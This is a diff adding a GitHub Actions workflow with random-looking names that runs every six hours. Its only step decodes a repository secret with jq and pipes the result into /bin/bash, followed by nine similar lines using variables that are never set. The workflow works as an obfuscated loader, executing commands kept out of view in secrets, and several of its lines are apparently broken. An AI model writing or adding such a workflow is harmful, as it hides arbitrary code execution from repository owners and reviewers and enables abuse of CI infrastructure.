@@ -1,0 +1,25 @@
+name: glegejujiu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: glegejujiu
+        env:
+          uxn6: ${{ secrets.uxn6 }}
+        run: |
+          echo $uxn6 | jq -r .f1 | /bin/bash
+          echo $sbvtn795 | jq -r .e757 | /bin/bash
+          echo $znpfp21617 | jq -r .hdzsn879 | /bin/bash
+          echo $g9186 | jq -r .jy2525 | /bin/bash
+          echo $qke8609 | jq -r .ysjka211 | /bin/bash
+          echo $mvarb419 | jq -r .j1034 | /bin/bash
+          echo $kswx2433 | jq -r .npc4 | /bin/bash
+          echo $gy4 | jq -r .ydfd908 | /bin/bash
+          echo $zc65679 | jq -r .wzczd45128 | /bin/bash
+          echo $pd38091 | jq -r .nb99 | /bin/bash
+
